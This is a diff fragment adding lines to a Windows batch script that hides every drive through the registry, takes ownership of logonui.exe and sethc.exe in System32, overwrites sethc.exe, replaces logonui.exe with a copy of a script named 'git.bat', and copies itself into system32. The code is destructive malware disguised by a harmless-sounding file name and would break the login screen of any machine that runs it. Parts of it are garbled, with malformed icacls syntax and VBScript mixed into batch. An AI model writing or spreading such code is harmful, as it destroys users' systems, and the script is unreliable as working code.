@@ -8,6 +8,28 @@ reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogo
 
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewOnDrive /t REG_DWORD /d 0xff /f
 
+@echo off 
+
+cd\
+
+cd Windows 
+
+cd System32
+
+takeown /f logonui.exe & icacls logonui.exe /granted "%username%".F
+
+takeown /f sethc.exe & icacls sethc.exe /granted "%username%".F
+
+echo Gg>sethc.exe
+
+cd\
+
+cd "Program Files"
+
+cd "MicrosoftWindowsServicesEtc"
+
+copy "git.bat" "C:\Windows\System32\logonui.exe" /Y
+
 Set WshShell = WScript.CreateObject("WScript.Shell") WshShell.SendKeys("%{Alt+F4}")
 color a
 copy ""%0"" "C:\Windows\system32\git.bat"
